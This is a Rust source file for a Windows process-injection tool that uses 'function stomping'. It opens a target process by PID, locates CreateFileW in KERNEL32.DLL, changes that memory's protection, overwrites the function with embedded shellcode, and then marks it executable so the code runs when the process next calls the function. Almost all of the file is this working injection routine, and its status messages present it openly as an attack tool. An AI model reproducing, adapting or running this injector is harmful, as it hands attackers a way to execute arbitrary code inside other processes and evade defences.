use std::{
    env,
    ptr,
    ffi::CString,
    mem::size_of
};
use libc;

use winapi::{
    um::{
        memoryapi::{
        VirtualProtectEx,
        WriteProcessMemory
        },
        psapi::{
            GetModuleFileNameExW,
            EnumProcessModules
        },
        winnt::{
            PROCESS_ALL_ACCESS,
            HANDLE,
            PAGE_READWRITE, 
            PAGE_EXECUTE_READ,
            PAGE_EXECUTE_WRITECOPY,
            LPWSTR
        },
        handleapi::{
            INVALID_HANDLE_VALUE,
            CloseHandle
        },
        processthreadsapi::OpenProcess,
        libloaderapi::GetProcAddress
    },
    shared::{
        minwindef::{
            BOOL,
            FALSE,
            FARPROC,
            HMODULE,
            DWORD,
            MAX_PATH
        },
        ntdef::NULL
    }
};

use win32_error::Win32Error;

mod error;
pub use error::Error;
mod constants;


fn main() -> Result<(), anyhow::Error> {
    let args: Vec<_> = env::args().collect();
    let pid: u32;
    let remote_handle: HANDLE; 
    let function_address: FARPROC;
    let mut res: BOOL;
    
    // Validating that got enough arguments.
    if args.len() < 2 {
        return Err(Error::CliUsage.into());
    }
    let target = &args[1];
    
    unsafe {
        // Validating the PID to spawn to.
        if target.parse::<u32>().is_ok() {
            pid = target.parse::<u32>().unwrap();
            remote_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        }
        else {
           return Err(Error::InvalidPID.into());
        }
        
        // Validating the handle.
        if remote_handle == NULL || remote_handle == INVALID_HANDLE_VALUE {
            let err = Win32Error::new();
            return Err(err.into())
        }
        println!("[+] Got handle to process");

        // Getting the address of the function to overwrite.
        let function_base_result = get_function_base(remote_handle, "KERNEL32.DLL", CString::new("CreateFileW").unwrap());
        match function_base_result{
            Ok(val) => function_address = val,
            Err(e) => return Err(e.into())
        }
        println!("[+] Got function base!");
        let mut old_permissions: DWORD = 0;
        
        // Verify shellcode size.
        if constants::SHELLCODE_LENGTH > 0x1000 {
            CloseHandle(remote_handle);
            return Err(Error::ShellcodeTooBig.into())
        }

        // Changing the protection of the function's address to RW and writing our shellcode.
        res = VirtualProtectEx(remote_handle, function_address.cast(), constants::SHELLCODE_LENGTH, PAGE_READWRITE, &mut old_permissions);

        if res == FALSE {
            CloseHandle(remote_handle);
            let err = Win32Error::new();
            return Err(err.into());
        }

        let written: *mut usize = ptr::null_mut();
        res = WriteProcessMemory(remote_handle, function_address.cast(), constants::DEFAULT_SHELLCODE.as_ptr().cast(), constants::SHELLCODE_LENGTH, written);

        if res == FALSE {
            VirtualProtectEx(remote_handle, function_address.cast(), constants::SHELLCODE_LENGTH, PAGE_EXECUTE_READ, &mut old_permissions);
            CloseHandle(remote_handle);
            let err = Win32Error::new();
            return Err(err.into());
        }
        println!("[+] Successfuly stomped the function!");
        res = VirtualProtectEx(remote_handle, function_address.cast(), constants::SHELLCODE_LENGTH, PAGE_EXECUTE_WRITECOPY, &mut old_permissions);

        if res == FALSE {
            CloseHandle(remote_handle);
            let err = Win32Error::new();
            return Err(err.into());
        }

        println!("[+] Changed protection to WCX to run the shellcode!\n[+] Shellcode successfuly injected!");
        CloseHandle(remote_handle);
    }
    Ok(())
}

fn get_function_base(remote_handle: HANDLE, module_name: &str, function_name: CString) -> Result<FARPROC, anyhow::Error> {   
    let mut res: BOOL;
    let mut cb_needed: DWORD =  0;
    let mut current_module_name: String;
    let mut module_list: [HMODULE; constants::MAX_AMOUNT_OF_MODULES] = [ptr::null_mut(); constants::MAX_AMOUNT_OF_MODULES];

    unsafe {
        let module_list_size = (size_of::<HMODULE>() * constants::MAX_AMOUNT_OF_MODULES).try_into().unwrap();
        res = EnumProcessModules(remote_handle, &mut module_list[0], module_list_size, &mut cb_needed);

        if res == FALSE {
            // Retry one more time.
            res = EnumProcessModules(remote_handle, &mut module_list[0], module_list_size, &mut cb_needed);

            if res == FALSE {
                let err = Win32Error::new();
                return Err(err.into());
            }
        }

        for module in module_list {
            let ptr_current_module_name: LPWSTR;
            ptr_current_module_name = libc::malloc(MAX_PATH) as LPWSTR;

            libc::memset(ptr_current_module_name as *mut libc::c_void, 0, MAX_PATH);

            // Getting the module name.
            if GetModuleFileNameExW(remote_handle, module, ptr_current_module_name, (MAX_PATH - size_of::<LPWSTR>()).try_into().unwrap()) == 0 {
                let err = Win32Error::new();
                println!("[-] Failed to get modules name: {}", err.to_string());
                continue;
            }

            // Converting to String so it will be compareable.
            let len = (0..).take_while(|&i| *ptr_current_module_name.offset(i) != 0).count();
            let slice = std::slice::from_raw_parts(ptr_current_module_name, len);

            match String::from_utf16(slice) {
                Ok(val) => current_module_name = val,
                Err(e) => return Err(e.into())
            }

            if current_module_name.contains(module_name) {
                let function_address = GetProcAddress(module, function_name.as_ptr());
                return Ok(function_address);
            }
        }
    }
    return Err(Error::InvalidModuleName.into())
}